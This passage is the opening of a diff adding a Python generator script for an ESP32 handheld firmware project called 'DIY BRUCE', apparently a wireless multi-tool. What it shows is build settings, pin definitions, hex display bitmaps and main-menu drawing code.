@@ -1,0 +1,2462 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+"""
+DIY BRUCE v25.0 - ПОВНИЙ ГЕНЕРАТОР ПРОЄКТУ
+Запустіть: python3 create_diy_bruce_complete.py
+"""
+
+import os
+import shutil
+
+PROJECT_NAME = "DIY_BRUCE_COMPLETE"
+
+# ============================================================================
+# platformio.ini
+# ============================================================================
+PLATFORMIO_INI = '''[env:esp32dev]
+platform = espressif32@6.6.0
+board = esp32dev
+framework = arduino
+monitor_speed = 115200
+upload_speed = 921600
+board_build.filesystem = littelfs
+board_build.partitions = default_4MB.csv
+
+build_flags =
+    -DCORE_DEBUG_LEVEL=0
+    -Os
+    -DARDUINO_USB_MODE=1
+    -DARDUINO_USB_CDC_ON_BOOT=0
+
+lib_deps =
+    olikraus/U8g2@^2.35.15
+    nRF24/RF24@^1.4.11
+    h2zero/NimBLE-Arduino@^2.3.9
+'''
+
+# ============================================================================
+# include/CONFIG.h
+# ============================================================================
+CONFIG_H = '''#ifndef CONFIG_H
+#define CONFIG_H
+
+#define FIRMWARE "DIY BRUCE v25.0"
+#define SCREEN_WIDTH 128
+#define SCREEN_HEIGHT 64
+
+// Піни кнопок
+#define BTN_UP     15
+#define BTN_DOWN   13
+#define BTN_OK     12
+#define BTN_LEFT   14
+#define BTN_RIGHT  27
+#define BTN_BACK   26
+
+// Піни NRF24
+#define NRF_CE      4
+#define NRF_CSN     5
+
+// I2C для дисплею
+#define I2C_SDA     21
+#define I2C_SCL     22
+
+// BLE налаштування
+#define BLE_DEVICE_NAME "DIY_BRUCE"
+
+// WiFi налаштування
+#define AP_SSID     "DIY_BRUCE"
+#define AP_PASSWORD "bruce1234"
+#define WEB_PORT    80
+#define DNS_PORT    53
+
+#define EEPROM_SIZE 4096
+#define DEBOUNCE_DELAY 200
+
+#endif
+'''
+
+# ============================================================================
+# include/hydra_logo.h
+# ============================================================================
+HYDRA_LOGO_H = '''#ifndef HYDRA_LOGO_H
+#define HYDRA_LOGO_H
+
+static const unsigned char hydra_logo[] PROGMEM = {
+  0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
+  0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
+  0xFF,0x80,0x00,0x00,0x00,0x00,0x00,0x01,0xFF,0x80,0x00,0x00,0x00,0x00,0x00,0x01,
+  0xFF,0x80,0x00,0x00,0x00,0x00,0x00,0x01,0xFF,0x80,0x0F,0xFF,0xFF,0xF0,0x00,0x01,
+  0xFF,0x80,0x3F,0xFF,0xFF,0xFC,0x00,0x01,0xFF,0x80,0x7C,0x00,0x00,0x3E,0x00,0x01,
+  0xFF,0x80,0xF0,0x00,0x00,0x0F,0x00,0x01,0xFF,0x81,0xE0,0x00,0x00,0x07,0x80,0x01,
+  0xFF,0x83,0xC0,0x00,0x00,0x03,0xC0,0x01,0xFF,0x83,0x80,0x00,0x00,0x01,0xC0,0x01,
+  0xFF,0x87,0x00,0x00,0x00,0x00,0xE0,0x01,0xFF,0x8F,0x00,0x00,0x00,0x00,0xF0,0x01,
+  0xFF,0x8E,0x00,0x00,0x00,0x00,0x70,0x01,0xFF,0x9E,0x00,0x00,0x00,0x00,0x78,0x01,
+  0xFF,0x9C,0x00,0x00,0x00,0x00,0x38,0x01,0xFF,0x9C,0x00,0x00,0x00,0x00,0x38,0x01,
+  0xFF,0x9C,0x00,0x00,0x00,0x00,0x38,0x01,0xFF,0x9E,0x00,0x00,0x00,0x00,0x78,0x01,
+  0xFF,0x8E,0x00,0x00,0x00,0x00,0x70,0x01,0xFF,0x8F,0x00,0x00,0x00,0x00,0xF0,0x01,
+  0xFF,0x87,0x00,0x00,0x00,0x00,0xE0,0x01,0xFF,0x83,0x80,0x00,0x00,0x01,0xC0,0x01,
+  0xFF,0x83,0xC0,0x00,0x00,0x03,0xC0,0x01,0xFF,0x81,0xE0,0x00,0x00,0x07,0x80,0x01,
+  0xFF,0x80,0xF0,0x00,0x00,0x0F,0x00,0x01,0xFF,0x80,0x7C,0x00,0x00,0x3E,0x00,0x01,
+  0xFF,0x80,0x3F,0xFF,0xFF,0xFC,0x00,0x01,0xFF,0x80,0x0F,0xFF,0xFF,0xF0,0x00,0x01,
+  0xFF,0x80,0x00,0x00,0x00,0x00,0x00,0x01,0xFF,0x80,0x00,0x00,0x00,0x00,0x00,0x01,
+  0xFF,0x80,0x00,0x00,0x00,0x00,0x00,0x01,0xFF,0x80,0x00,0x00,0x00,0x00,0x00,0x01,
+  0xFF,0x80,0x00,0x00,0x00,0x00,0x00,0x01,0xFF,0x80,0x00,0x00,0x00,0x00,0x00,0x01,
+  0xFF,0x80,0x00,0x00,0x00,0x00,0x00,0x01,0xFF,0x80,0x00,0x00,0x00,0x00,0x00,0x01,
+  0xFF,0x80,0x00,0x00,0x00,0x00,0x00,0x01,0xFF,0x80,0x00,0x00,0x00,0x00,0x00,0x01,
+  0xFF,0x80,0x00,0x00,0x00,0x00,0x00,0x01,0xFF,0x80,0x00,0x00,0x00,0x00,0x00,0x01,
+  0xFF,0x80,0x00,0x00,0x00,0x00,0x00,0x01,0xFF,0x80,0x00,0x00,0x00,0x00,0x00,0x01,
+  0xFF,0x80,0x00,0x00,0x00,0x00,0x00,0x01,0xFF,0x80,0x00,0x00,0x00,0x00,0x00,0x01,
+  0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
+  0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF
+};
+
+#endif
+'''
+
+# ============================================================================
+# include/icons.h (ВСІ іконки з interface.h)
+# ============================================================================
+ICONS_H = '''#ifndef ICONS_H
+#define ICONS_H
+
+// ==================== ІКОНКИ З interface.h ====================
+
+// WiFi
+static const unsigned char PROGMEM image_WiFi_bits[] = {
+  0x00,0x03,0xff,0x80,0x00,0x00,0x03,0xff,0x80,0x00,0x00,0x3f,0xff,0xf8,0x00,0x00,0x3f,0xff,0xf8,0x00,0x03,0xfc,0x00,
+  0x7f,0x80,0x03,0xfc,0x00,0x7f,0x80,0x0f,0xc3,0xff,0x87,0xe0,0x0f,0xc3,0xff,0x87,0xe0,0x3f,0x3f,0xff,0xf9,0xf8,0x3f,
+  0x3f,0xff,0xf9,0xf8,0xfc,0xff,0x01,0xfe,0x7e,0xfc,0xff,0x01,0xfe,0x7e,0x33,0xf0,0xfe,0x1f,0x98,0x33,0xf0,0xfe,0x1f,
+  0x98,0x0f,0xcf,0xff,0xe7,0xe0,0x0f,0xcf,0xff,0xe7,0xe0,0x03,0x3f,0x01,0xf9,0x80,0x03,0x3f,0x01,0xf9,0x80,0x03,0x3f,
+  0x01,0xf9,0x80,0x00,0xfc,0xfe,0x7e,0x00,0x00,0xfc,0xfe,0x7e,0x00,0x00,0x33,0xff,0x98,0x00,0x00,0x33,0xff,0x98,0x00,
+  0x00,0x0f,0xc7,0xe0,0x00,0x00,0x0f,0xc7,0xe0,0x00,0x00,0x03,0x39,0x80,0x00,0x00,0x03,0x39,0x80,0x00,0x00,0x00,0xfe,
+  0x00,0x00,0x00,0x00,0xfe,0x00,0x00,0x00,0x00,0x38,0x00,0x00,0x00,0x00,0x38,0x00,0x00
+};
+
+// Bluetooth
+static const unsigned char PROGMEM image_Bluetooth_bits[] = {
+  0x00,0x30,0x00,0x00,0x30,0x00,0x00,0x30,0x00,0x00,0x30,0x00,0x00,0x3f,0x80,0x00,0x3f,0x80,0x00,0x3f,0x80,0xc0,0x30,
+  0x70,0xc0,0x30,0x70,0xc0,0x30,0x70,0xc0,0x30,0x70,0x38,0x30,0x0c,0x38,0x30,0x0c,0x38,0x30,0x0c,0x07,0xf0,0x70,0x07,
+  0xf0,0x70,0x07,0xf0,0x70,0x07,0xf0,0x70,0x00,0x3f,0x80,0x00,0x3f,0x80,0x00,0x3f,0x80,0x00,0x3f,0x80,0x07,0xf0,0x70,
+  0x07,0xf0,0x70,0x07,0xf0,0x70,0x38,0x30,0x0c,0x38,0x30,0x0c,0x38,0x30,0x0c,0x38,0x30,0x0c,0xc0,0x30,0x70,0xc0,0x30,
+  0x70,0xc0,0x30,0x70,0x00,0x3f,0x80,0x00,0x3f,0x80,0x00,0x3f,0x80,0x00,0x30,0x00,0x00,0x30,0x00,0x00,0x30,0x00
+};
+
+// SubGHz
+static const unsigned char PROGMEM image_SubGHz_bits[] = {
+  0x0e,0x00,0x00,0x01,0xe0,0x0e,0x00,0x00,0x01,0xe0,0x0e,0x00,0x00,0x01,0xe0,0xf0,0x1e,0x00,0xf0,0x1e,0xf0,0x1e,0x00,
+  0xf0,0x1e,0xf0,0x1e,0x00,0xf0,0x1e,0xf0,0x1e,0x00,0xf0,0x1e,0xf1,0xe0,0x00,0x0e,0x1e,0xf1,0xe0,0x00,0x0e,0x1e,0xf1,
+  0xe0,0xfe,0x0e,0x1e,0xf1,0xe0,0xfe,0x0e,0x1e,0xf1,0xe0,0xfe,0x0e,0x1e,0xf1,0xe0,0xfe,0x0e,0x1e,0xf1,0xe0,0xfe,0x0e,
+  0x1e,0xf1,0xe0,0xfe,0x0e,0x1e,0xf1,0xe0,0xfe,0x0e,0x1e,0xf0,0x00,0x00,0x00,0x1e,0xf0,0x00,0x00,0x00,0x1e,0x0e,0x00,
+  0x00,0x01,0xe0,0x0e,0x00,0x00,0x01,0xe0,0x0e,0x01,0xfe,0x01,0xe0,0x0e,0x01,0xfe,0x01,0xe0,0x00,0x01,0xfe,0x00,0x00,
+  0x00,0x01,0xfe,0x00,0x00,0x00,0x01,0xfe,0x00,0x00,0x00,0x01,0xfe,0x00,0x00,0x00,0x01,0xfe,0x00,0x00,0x00,0x01,0xfe,
+  0x00,0x00,0x00,0x01,0xfe,0x00,0x00,0x00,0x01,0xfe,0x00,0x00,0x00,0x01,0xfe,0x00,0x00,0x00,0x01,0xfe,0x00,0x00,0x00,
+  0x01,0xfe,0x00,0x00,0x00,0x01,0xfe,0x00,0x00,0x00,0x01,0xfe,0x00,0x00,0x00,0x01,0xfe,0x00,0x00,0x00,0x01,0xfe,0x00,
+  0x00,0x00,0x01,0xfe,0x00,0x00,0x00,0x01,0xfe,0x00,0x00
+};
+
+// Infrared
+static const unsigned char PROGMEM image_IR_bits[] = {
+  0x01,0xff,0xff,0xe0,0x00,0x01,0xff,0xff,0xe0,0x00,0x3e,0x00,0x00,0x1f,0x00,0x3e,0x00,0x00,0x1f,0x00,0x3e,0x00,0x00,
+  0x1f,0x00,0xc0,0x00,0x00,0x00,0xc0,0xc0,0x00,0x00,0x00,0xc0,0xc0,0x00,0x00,0x00,0xc0,0x00,0x7f,0xff,0x80,0x00,0x00,
+  0x7f,0xff,0x80,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x80,0x00,0x60,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x07,0xf8,0x00,0x00,0x00,0x07,0xf8,0x00,0x00,0x00,0x07,0xf8,0x00,0x00,0x00,0x00,
+  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+  0x00,0x07,0xf8,0x00,0x00,0x00,0x07,0xf8,0x00,0x00,0x00,0x7f,0xff,0x80,0x00,0x00,0x7f,0xff,0x80,0x00,0x01,0xff,0xff,
+  0xe0,0x00,0x01,0xff,0xff,0xe0,0x00,0x01,0xff,0xff,0xe0,0x00,0x01,0xff,0xff,0xe0,0x00,0x01,0xff,0xff,0xe0,0x00,0x01,
+  0xff,0xff,0xe0,0x00,0xff,0xff,0xff,0xff,0xc0,0xff,0xff,0xff,0xff,0xc0
+};
+
+// GPIO
+static const unsigned char PROGMEM image_GPIO_bits[] = {
+  0xfe,0x07,0xfc,0x00,0x00,0xfe,0x07,0xfc,0x00,0x00,0xc6,0x07,0x1c,0x00,0x00,0xc6,0x07,0x1c,0x00,0x00,0xc6,0x07,0x1c,
+  0x00,0x00,0xc6,0x07,0x1c,0x00,0x00,0xc1,0xf8,0x1f,0x80,0x00,0xc1,0xf8,0x1f,0x80,0x00,0xc0,0x00,0x00,0x60,0x00,0xc0,
+  0x00,0x00,0x60,0x00,0xc0,0x00,0x00,0x60,0x00,0xc0,0x00,0x00,0x60,0x00,0xc0,0x00,0x00,0x60,0x00,0xc0,0x00,0x00,0x60,
+  0x00,0xc0,0x00,0x1f,0x80,0x00,0xc0,0x00,0x1f,0x80,0x00,0xc0,0x00,0x1f,0x80,0x00,0xc0,0x00,0x1c,0x7f,0x00,0xc0,0x00,
+  0x1c,0x7f,0x00,0xc0,0x00,0x1c,0x7f,0x00,0xfe,0x07,0xfc,0x03,0x00,0xfe,0x07,0xfc,0x03,0x00,0xfe,0x07,0xfc,0x03,0x00,
+  0x06,0x07,0x00,0x03,0xf0,0x06,0x07,0x00,0x03,0xf0,0x06,0x07,0x00,0x03,0xf0,0x01,0xf8,0xe0,0x00,0x0c,0x01,0xf8,0xe0,
+  0x00,0x0c,0x01,0xf8,0xe0,0x00,0x0c,0x00,0x00,0xe0,0x00,0x0c,0x00,0x00,0xe0,0x00,0x0c,0x00,0x00,0xe0,0x00,0x0c,0x00,
+  0x1f,0x00,0x03,0xf0,0x00,0x1f,0x00,0x03,0xf0,0x00,0x18,0x00,0x03,0x00,0x00,0x18,0x00,0x03,0x00,0x00,0x18,0x00,0x03,
+  0x00,0x00,0x18,0x00,0x03,0x00,0x00,0x1f,0xff,0xff,0x00,0x00,0x1f,0xff,0xff,0x00
+};
+
+// Games
+static const unsigned char PROGMEM image_Games_bits[] = {
+  0x3f,0xff,0xff,0xf0,0x3f,0xff,0xff,0xf0,0xc3,0x00,0xcc,0xcc,0xc3,0x00,0xcc,0xcc,0xc3,0x00,0xcc,0xc3,0xc3,0x00,0xcc,0xc3,
+  0xc3,0x00,0xfc,0xc3,0xc3,0x00,0xfc,0xc3,0xc3,0x00,0x00,0xc3,0xc3,0x00,0x00,0xc3,0xc0,0xff,0xff,0x03,0xc0,0xff,0xff,0x03,
+  0xc0,0x00,0x00,0x03,0xc0,0x00,0x00,0x03,0xc0,0x00,0x00,0x03,0xc0,0x00,0x00,0x03,0xc0,0x00,0x00,0x03,0xc0,0x00,0x00,0x03,
+  0xc3,0xff,0xff,0xc3,0xc3,0xff,0xff,0xc3,0xc3,0x00,0x00,0xc3,0xc3,0x00,0x00,0xc3,0xc3,0x3f,0xfc,0xc3,0xc3,0x3f,0xfc,0xc3,
+  0xc3,0x00,0x00,0xc3,0xc3,0x00,0x00,0xc3,0xf3,0x3f,0xfc,0xcf,0xf3,0x3f,0xfc,0xcf,0xc3,0x00,0x00,0xc3,0xc3,0x00,0x00,0xc3,
+  0x3f,0xff,0xff,0xfc,0x3f,0xff,0xff,0xfc
+};
+
+// Config
+static const unsigned char PROGMEM image_Config_bits[] = {
+  0x00,0x0f,0xf0,0x00,0x00,0x0f,0xf0,0x00,0x03,0x0c,0x30,0xc0,0x03,0x0c,0x30,0xc0,0x0c,0xf0,0x0f,0x30,0x0c,0xf0,0x0f,
+  0x30,0x30,0x00,0x00,0x0c,0x30,0x00,0x00,0x0c,0x0c,0x0f,0xf0,0x30,0x0c,0x0f,0xf0,0x30,0x0c,0x30,0x0c,0x30,0x0c,0x30,
+  0x0c,0x30,0xf0,0xc0,0x03,0x0f,0xf0,0xc0,0x03,0x0f,0xc0,0xc0,0x03,0x03,0xc0,0xc0,0x03,0x03,0xc0,0xc0,0x03,0x03,0xc0,
+  0xc0,0x03,0x03,0xf0,0xc0,0x03,0x0f,0xf0,0xc0,0x03,0x0f,0x0c,0x30,0x0c,0x30,0x0c,0x30,0x0c,0x30,0x0c,0x0f,0xf0,0x30,
+  0x0c,0x0f,0xf0,0x30,0x30,0x00,0x00,0x0c,0x30,0x00,0x00,0x0c,0x0c,0xf0,0x0f,0x30,0x0c,0xf0,0x0f,0x30,0x03,0x0c,0x30,
+  0xc0,0x03,0x0c,0x30,0xc0,0x00,0x0f,0xf0,0x00,0x00,0x0f,0xf0,0x00
+};
+
+// Точки меню
+static const unsigned char PROGMEM image_DOTsel_bits[] = {0x60,0xf0,0xf0,0x60};
+static const unsigned char PROGMEM image_DOT_bits[] = {0x60,0x90,0x90,0x60};
+
+// Логотип ESPHACK
+static const unsigned char PROGMEM image_ESPHACK_bits[] = {
+  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x7f,0xff,0xfe,0xff,0xff,0xfe,0x0f,0xff,0xff,0x80,0x00,0x00,0x00,
+  0x00,0x00,0x00,0xff,0x8f,0xfc,0xff,0xcf,0xfe,0x1f,0xf9,0xff,0x80,0x00,0x00,0x00,0x00,0x00,0x01,0xff,0x9f,0xf9,0xff,
+  0x8f,0xfc,0x3f,0xf1,0xff,0x80,0x00,0x00,0x00,0x00,0x00,0x01,0xff,0x1f,0xf9,0xff,0x9f,0xf8,0x7f,0xf3,0xff,0x00,0x00,
+  0x00,0x00,0x00,0x00,0x03,0xff,0x3f,0xf3,0xff,0x3f,0xf0,0x7f,0xe3,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x03,0xfe,0x3f,
+  0xf3,0xff,0x00,0x00,0xff,0xe7,0xfe,0x00,0x00,0x00,0x00,0x00,0x00,0x07,0xfe,0x7f,0xe7,0xff,0xff,0xe0,0xff,0xcf,0xfc,
+  0x00,0x00,0x00,0x00,0x00,0x00,0x0f,0xff,0xff,0xc7,0xff,0xff,0xe1,0xff,0xcf,0xfc,0x00,0x00,0x00,0x00,0x00,0x00,0x0f,
+  0xfc,0x00,0x00,0x00,0xff,0xe1,0xff,0x9f,0xf8,0x00,0x00,0x00,0x00,0x00,0x00,0x1f,0xf8,0xff,0x8f,0xfc,0xff,0xc3,0xff,
+  0x1f,0xf8,0x00,0x00,0x00,0x00,0x00,0x00,0x1f,0xf9,0xff,0x9f,0xf9,0xff,0xc7,0xff,0x3f,0xf0,0x00,0x00,0x00,0x00,0x00,
+  0x00,0x3f,0xf1,0xff,0xbf,0xf9,0xff,0x87,0xfe,0x7f,0xe0,0x00,0x00,0x00,0x00,0x00,0x00,0x7f,0xe3,0xff,0x3f,0xf3,0xff,
+  0x8f,0xfe,0x7f,0xe0,0x00,0x00,0x00,0x00,0x00,0x00,0x7f,0xe7,0xfe,0x7f,0xf3,0xff,0x0f,0xff,0xff,0xc0,0x00,0x00,0x00,
+  0x00,0x00,0x00,0xff,0xff,0xfc,0x7f,0xff,0xfe,0x1f,0xff,0xff,0x80,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+  0x00,0x00,0x3f,0xf8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x3f,0xf0,0x00,0x00,0x00,
+  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x3f,0xe0,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+  0x00,0x00,0x00,0x00,0x3f,0xe0,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x1f,0xc0,0x00,
+  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,0x1f,0xc0,0x00,0x10,0x00,0x00,0x00,0x00,0x00,0x00,
+  0xe0,0x00,0x00,0x00,0x00,0x00,0x0f,0x80,0x00,0x38,0x00,0x00,0x00,0x00,0x00,0x00,0xf0,0x00,0x00,0x00,0x00,0x00,0x0f,
+  0x00,0x00,0x78,0x00,0x00,0x00,0x00,0x00,0x01,0xf0,0x00,0x00,0x00,0x00,0x00,0x07,0x00,0x00,0x7c,0x00,0x00,0x00,0x00,
+  0x00,0x01,0xf8,0x00,0x00,0x00,0x00,0x00,0x02,0x00,0x00,0xfe,0x00,0x00,0x00,0x00,0x00,0x03,0xf8,0x00,0x00,0x00,0x00,
+  0x00,0x00,0x00,0x00,0xfe,0x00,0x00,0x00,0x00,0x00,0x07,0xfc,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0xff,0x00,0x00,
+  0x00,0x00,0x00,0x07,0xfc,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0xff,0x00,0x00,0x00,0x00,0x00,0x0f,0xfc,0x00,0x00,
+  0x00,0x00,0x00,0x00,0x00,0x03,0xff,0x00,0x00,0x00,0x00,0x00,0x0f,0xfc,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x07,0xff,
+  0x00,0x00,0x00,0x00,0x00,0x1f,0xfc,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x07,0xfe,0x00,0x00,0x00,0x00,0x00,0x3f,0xff,
+  0xff,0x87,0xff,0xff,0xc7,0xff,0xff,0xef,0xfe,0x7f,0xe0,0x00,0x00,0x00,0x3f,0xf3,0xff,0x9f,0xf9,0xff,0xcf,0xfc,0xff,
+  0xef,0xfc,0x7f,0xe0,0x00,0x00,0x00,0x7f,0xf3,0xff,0x1f,0xf9,0xff,0xdf,0xf8,0xff,0xdf,0xfc,0xff,0xc0,0x00,0x00,0x00,
+  0x7f,0xe3,0xff,0x3f,0xf3,0xff,0x9f,0xf9,0xff,0x9f,0xf9,0xff,0xc0,0x00,0x00,0x00,0xff,0xe7,0xfe,0x3f,0xe3,0xff,0x3f,
+  0xf1,0xff,0x3f,0xff,0xff,0x80,0x00,0x00,0x00,0xff,0xcf,0xfe,0x00,0x07,0xff,0x3f,0xf0,0x00,0x7f,0xff,0x00,0x00,0x00,
+  0x00,0x01,0xff,0x8f,0xfc,0xff,0xff,0xfe,0x7f,0xe3,0xfe,0x7f,0xe7,0x80,0x00,0x00,0x00,0x03,0xff,0x9f,0xfd,0xff,0xff,
+  0xfe,0xff,0xe7,0xfe,0xff,0xe7,0x80,0x00,0x00,0x00,0x03,0xff,0x1f,0xf9,0xff,0x9f,0xfc,0xff,0xcf,0xfc,0xff,0xcf,0xc0,
+  0x00,0x00,0x00,0x07,0xff,0x3f,0xf3,0xff,0x9f,0xf9,0xff,0x8f,0xfd,0xff,0xcf,0xe0,0x00,0x00,0x00,0x07,0xfe,0x7f,0xf3,
+  0xff,0x3f,0xf9,0xff,0x9f,0xf9,0xff,0x9f,0xe0,0x00,0x00,0x00,0x1f,0xfc,0x7f,0xe7,0xfe,0x3f,0xf3,0xff,0x1f,0xfb,0xff,
+  0x3f,0xf0,0x00,0x00,0x00,0x1f,0xfc,0xff,0xe7,0xfe,0x7f,0xf7,0xff,0xbf,0xf3,0xff,0x3f,0xf0,0x00,0x00,0x00,0x1f,0xf8,
+  0xff,0xcf,0xff,0xff,0xe7,0xff,0xff,0xf7,0xfe,0x7f,0xf0,0x00,0x00,0x00,0x1f,0xf0,0xff,0x8f,0xff,0xff,0xcf,0xff,0xff,
+  0xe7,0xfc,0x7f,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
+};
+
+#endif
+'''
+
+# ============================================================================
+# include/interface.h (ГОЛОВНЕ МЕНЮ)
+# ============================================================================
+INTERFACE_H = '''#ifndef INTERFACE_H
+#define INTERFACE_H
+
+#include "display.h"
+#include "CONFIG.h"
+
+#define MENU_ITEM_COUNT 7
+
+void returnToMainMenu();
+
+static const unsigned char PROGMEM image_DOTsel_bits[] = {0x60,0xf0,0xf0,0x60};
+static const unsigned char PROGMEM image_DOT_bits[] = {0x60,0x90,0x90,0x60};
+
+// Екстерні іконки
+extern const unsigned char PROGMEM image_WiFi_bits[];
+extern const unsigned char PROGMEM image_Bluetooth_bits[];
+extern const unsigned char PROGMEM image_SubGHz_bits[];
+extern const unsigned char PROGMEM image_IR_bits[];
+extern const unsigned char PROGMEM image_GPIO_bits[];
+extern const unsigned char PROGMEM image_Games_bits[];
+extern const unsigned char PROGMEM image_Config_bits[];
+extern const unsigned char PROGMEM image_ESPHACK_bits[];
+
+constexpr int16_t MAIN_MENU_DOT_START_Y = 6;
+constexpr int16_t MAIN_MENU_DOT_STEP_Y = 8;
+
+inline void drawMainMenuDots(DisplayType &display) {
+  for (byte i = 0; i < MENU_ITEM_COUNT; i++) {
+    display.drawBitmap(122, MAIN_MENU_DOT_START_Y + (i * MAIN_MENU_DOT_STEP_Y), image_DOT_bits, 4, 4, 1);
+  }
+}
+
+inline int16_t getMainMenuDotY(byte menuIndex) {
+  return MAIN_MENU_DOT_START_Y + (menuIndex * MAIN_MENU_DOT_STEP_Y);
+}
+
+inline void drawMainMenuSelectedDot(DisplayType &display, int16_t y) {
+  display.drawBitmap(122, y, image_DOTsel_bits, 4, 4, 1);
+}
+
+inline void drawMainMenuPage(DisplayType &display, byte menuIndex, int16_t yOffset = 0) {
+  if (menuIndex == 0) {
+    display.drawBitmap(6, 17 + yOffset, image_WiFi_bits, 39, 31, 1);
+    display.setTextColor(1);
+    display.setTextSize(2);
+    display.setTextWrap(false);
+    display.setCursor(59, 25 + yOffset);
+    display.print("WiFi");
+  } else if (menuIndex == 1) {
+    display.drawBitmap(15, 13 + yOffset, image_Bluetooth_bits, 22, 38, 1);
+    display.setTextColor(1);
+    display.setTextSize(2);
+    display.setCursor(62, 25 + yOffset);
+    display.print("BLE");
+  } else if (menuIndex == 2) {
+    display.drawBitmap(5, 14 + yOffset, image_SubGHz_bits, 39, 39, 1);
+    display.setTextColor(1);
+    display.setTextSize(2);
+    display.setCursor(48, 25 + yOffset);
+    display.print("SubGHz");
+  } else if (menuIndex == 3) {
+    display.drawBitmap(8, 15 + yOffset, image_IR_bits, 34, 35, 1);
+    display.setTextColor(1);
+    display.setTextSize(2);
+    display.setCursor(69, 25 + yOffset);
+    display.print("IR");
+  } else if (menuIndex == 4) {
+    display.drawBitmap(7, 12 + yOffset, image_GPIO_bits, 38, 40, 1);
+    display.setTextColor(1);
+    display.setTextSize(2);
+    display.setCursor(59, 25 + yOffset);
+    display.print("GPIO");
+  } else if (menuIndex == 5) {
+    display.drawBitmap(7, 16 + yOffset, image_Games_bits, 32, 32, 1);
+    display.setTextColor(1);
+    display.setTextSize(2);
+    display.setCursor(52, 25 + yOffset);
+    display.print("Games");
+  } else if (menuIndex == 6) {
+    display.drawBitmap(7, 16 + yOffset, image_Config_bits, 32, 32, 1);
+    display.setTextColor(1);
+    display.setTextSize(2);
+    display.setCursor(46, 25 + yOffset);
+    display.print("Config");
+  }
+}
+
+inline void OLED_printLogo(DisplayType &display) {
+  display.clearDisplay();
+  display.drawBitmap(0, 0, image_ESPHACK_bits, 128, 64, 1);
+  display.setTextColor(1);
+  display.setTextWrap(false);
+  display.setCursor(2, 2);
+  display.print(FIRMWARE);
+  display.display();
+  delay(2000);
+}
+
+inline void OLED_printMenu(DisplayType &display, byte menuIndex) {
+  display.clearDisplay();
+  drawMainMenuDots(display);
+  drawMainMenuPage(display, menuIndex);
+  drawMainMenuSelectedDot(display, getMainMenuDotY(menuIndex));
+  display.display();
+}
+
+#endif
+'''
+
+# ============================================================================
+# data/index.html (ВЕБ САЙТ З 12 СТОРІНКАМИ)
+# ============================================================================
+INDEX_HTML = '''<!DOCTYPE html>
